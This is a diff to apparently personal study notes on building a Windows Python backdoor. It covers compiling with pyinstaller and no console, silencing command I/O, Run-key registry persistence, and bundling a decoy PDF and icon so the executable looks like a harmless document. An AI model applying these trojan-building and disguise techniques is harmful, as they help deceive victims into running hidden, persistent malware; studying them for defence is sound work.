@@ -18,14 +18,14 @@
 	- To execute with no console`pyinstaller client.py --onefile --noconsole`
 		- `subprocess.check_output()` interacts with `stdio` and `stderr` by default
 			- to disable interaction
-				-
-				  ```
-				  DEVNULL = open(os.devnull,'wb')
-				  return subprocess.check_output(command, 
-								shell=True,
-								stderr=DEVNULL,
-								stdin=DEVNULL)
-				  ```
+			  ```
+			  DEVNULL = open(os.devnull,'wb')
+                          # All I/O will be redirected to DEVNULL
+			  return subprocess.check_output(command, 
+							shell=True,
+							stderr=DEVNULL,
+							stdin=DEVNULL)
+			  ```
 - **Persistence**
 	- Key - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
 		- Fields
@@ -46,11 +46,11 @@
 - `pyinstaller --add-data "../dummy/image.png:." --onefile --noconsole backdoor.py -n scheduler.exe`
 	- `--add-file` - `src-file-path:.` ; `:.` tell pyinstaller to keep the front files in the default application temp directory
 	- The code below executes the front files
-	-
 	  ```
 	  file_name = sys._MEIPASS + "\Resume.pdf"
 	  subprocess.call(file_name, shell = True)
 	  ```
+   	- `_MEIPASS` : the path to the _internal folder within the bundle [ in this case, the Non-Malicious PDF ]
 - **mask executable** with `.ICO`
 	- `pyinstaller --add-data "../dummy/Template.pdf:." --onefile --noconsole backdoor.py -n Template --icon <path-to-ico-file>`
 	- ![image.png](./assets/image_1722969936363_0.png)
